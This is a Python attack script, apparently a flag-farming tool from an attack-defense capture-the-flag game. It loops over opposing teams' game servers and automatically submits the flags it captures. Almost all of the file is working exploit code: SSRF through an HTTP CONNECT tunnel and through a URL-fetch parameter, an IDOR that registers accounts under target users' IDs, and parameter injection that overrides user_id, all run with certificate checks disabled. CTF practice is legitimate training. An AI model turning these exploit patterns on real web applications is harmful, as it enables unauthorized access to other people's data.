#!/usr/bin/env python3
import requests
import re
import time
import socket
import ssl
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- ZERO GRAVITY CONFIGURATION ---
MY_TEAM = "09"
SUBMIT_TOKEN = "***"
SUBMIT_URL = f"***"
TARGET_TEAMS = ["01", "02", "03", "04", "05", "06", "07", "08", "10"] # 10 teams - 09

# Flag format regex
FLAG_REGEX = re.compile(r'[0-9]+_[0-9]+_[0-9]+_[a-f0-9]{16}')

# Network Topology (Game Subnet 10.10.TEAM.X)
PORT_MAP = {
    "docs": {"ip_last": 103, "port": 8443, "proto": "https"},
    "milstorage": {"ip_last": 105, "port": 443, "proto": "https"},
    "classified": {"ip_last": 105, "port": 443, "proto": "https"},
    "milnet": {"ip_last": 106, "port": 443, "proto": "https"},
    "gitspace": {"ip_last": 112, "port": 8080, "proto": "http"},
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RedAgentFarm:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.captured_flags = set()

    def submit_flag(self, flag, service, team):
        if flag in self.captured_flags:
            return
        
        try:
            r = requests.post(SUBMIT_URL, data={"flag": flag, "token": ***}, verify=False, timeout=5)
            if r.status_code == 200:
                print(f"  [+] ACCEPTED: [{service}] Team {team} -> {flag}")
                self.captured_flags.add(flag)
                return True
            else:
                print(f"  [!] REJECTED: [{service}] Team {team} -> {flag} ({r.status_code})")
        except:
            pass
        return False

    # --- SERVICE EXPLOITS ---

    def exploit_docs(self, team_id):
        """Docs SSRF via CONNECT tunnel"""
        target_ip = f"10.10.{int(team_id)}.{PORT_MAP['docs']['ip_last']}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            context = ssl._create_unverified_context()
            ssl_sock = context.wrap_socket(sock)
            ssl_sock.connect((target_ip, PORT_MAP['docs']['port']))
            
            # SSRF to internal backend
            connect_req = f"CONNECT docker.internal:61000 HTTP/1.1\r\nHost: docker.internal:61000\r\n\r\n"
            ssl_sock.sendall(connect_req.encode())
            
            resp = ssl_sock.recv(4096).decode('utf-8', errors='ignore')
            if "200" in resp:
                ssl_sock.sendall(b"LISTDOCS\nEXIT\n")
                time.sleep(0.5)
                data = ssl_sock.recv(16384).decode('utf-8', errors='ignore')
                for flag in FLAG_REGEX.findall(data):
                    self.submit_flag(flag, "Docs", team_id)
            ssl_sock.close()
        except:
            pass

    def exploit_milstorage(self, team_id):
        """Milstorage SSRF to C API"""
        target_ip = f"10.10.{int(team_id)}.{PORT_MAP['milstorage']['ip_last']}"
        url = f"https://{target_ip}/api/integration/fetch-resource?url=http://127.0.0.1:9999/status"
        try:
            r = self.session.get(url)
            for flag in FLAG_REGEX.findall(r.text):
                self.submit_flag(flag, "Milstorage", team_id)
        except:
            pass

    def exploit_classified(self, team_id):
        """Classified IDOR Exploit (Teams 01, 03, 08 verified)"""
        target = f"***" # DNS hostname
        base_url = f"https://{target}"
        
        try:
            # 1. Register & Login to get session
            username = f"farm{int(time.time())%10000}"
            military_id = str(int(time.time())%100000).zfill(5)
            
            s = requests.Session()
            s.verify = False
            s.timeout = 5
            
            s.post(f"{base_url}/register",
                   data={"username": username, "military_id": military_id, 
                         "password": "x", "confirm_password": "x"}, # Added confirm_password
                   timeout=5)
            
            # Login
            r = s.post(f"{base_url}/login",
                   json={"username": username, "password": "x"},
                   timeout=5)
            
            if not r.json().get('ok'):
                return

            # 2. Scrape Top Secret IDs from our dashboard
            r = s.get(f"{base_url}/userspace/{military_id}", timeout=5)
            pattern = r'(\w+)\s*\((\d{5})\)\s*[-–]\s*Top\s*Secret'
            target_ids = [m[1] for m in re.findall(pattern, r.text, re.IGNORECASE)]
            
            # 3. IDOR logic (create user with matching ID to access document)
            # Actually docclasifier2.py logic is: register NEW user with target ID
            # to calculate correct path? No wait.
            # RUST: /userspace/<id> shows docs for THAT id.
            # We need to register as the target ID?
            # docclasifier2: "username = ..._{military_id}" -> register -> login -> view dashboard
            
            for tid in target_ids:
                try:
                    t_user = f"e{int(time.time())%1000}_{tid}"
                    s2 = requests.Session()
                    s2.verify = False
                    s2.post(f"{base_url}/register",
                           data={"username": t_user, "military_id": tid, 
                                 "password": "x", "confirm_password": "x"},
                           timeout=5)
                    s2.post(f"{base_url}/login", json={"username": t_user, "password": "x"})
                    
                    dash = s2.get(f"{base_url}/userspace/{tid}")
                    links = re.findall(r'/download/([a-f0-9]+)', dash.text)
                    
                    for link in links:
                        f = s2.get(f"{base_url}/download/{link}")
                        for flag in FLAG_REGEX.findall(f.text):
                            self.submit_flag(flag, "Classified", team_id)
                except:
                    pass
        except:
            pass

    def exploit_milnet(self, team_id):
        """Milnet SSRF via verify_node -> internal Flask API -> flag extraction"""
        target_ip = f"10.10.{int(team_id)}.{PORT_MAP['milnet']['ip_last']}"
        base = f"https://{target_ip}"
        s = requests.Session()
        s.verify = False
        s.timeout = 4

        # Register + Login
        username = f"farm{int(time.time()) % 99999}"
        try:
            s.post(f"{base}/register.php",
                   data={"username": username, "password": "Qwerty123!"},
                   allow_redirects=False)
            s.post(f"{base}/login.php",
                   data={"username": username, "password": "Qwerty123!"},
                   allow_redirects=False)
        except:
            return

        if "PHPSESSID" not in s.cookies.get_dict():
            return

        # Scrape index for node names
        try:
            r = s.get(f"{base}/index.php")
            for flag in FLAG_REGEX.findall(r.text):
                self.submit_flag(flag, "Milnet", team_id)

            nodes = list(set(re.findall(r'<b>([^<]{2,40})</b>', r.text)))
        except:
            return

        # SSRF: inject user_id override via verify_node
        for uid in range(1, 50):
            for node in nodes[:15]:
                try:
                    r = s.post(f"{base}/index.php",
                               data={"verify_node": f"{node}&user_id={uid}#"},
                               timeout=3)
                    for flag in FLAG_REGEX.findall(r.text):
                        self.submit_flag(flag, "Milnet", team_id)
                except:
                    pass

    def attack_team(self, team_id):
        print(f"[*] >>> STRIKING TEAM {team_id} <<<")
        self.exploit_docs(team_id)
        self.exploit_milstorage(team_id)
        self.exploit_milnet(team_id)
        self.exploit_classified(team_id)
        # self.exploit_classified(team_id) # Add when IP/DNS confirmed
        # self.exploit_gitspace(team_id) # Add when traversal paths confirmed

    def run(self):
        print(f"\n{'='*70}")
        print(f"[!] RED AGENT ULTIMATE FARM v1.0 [Team {MY_TEAM}]")
        print(f"{'='*70}\n")
        
        while True:
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(self.attack_team, TARGET_TEAMS)
            
            elapsed = time.time() - start_time
            print(f"\n[✓] Round finished in {elapsed:.2f}s. Captured unique flags: {len(self.captured_flags)}")
            print(f"[*] Resurrecting in 60s...\n")
            time.sleep(60)

if __name__ == "__main__":
    agent = RedAgentFarm()
    try:
        agent.run()
    except KeyboardInterrupt:
        print("\n[!] Farm shutdown. Peace out.")
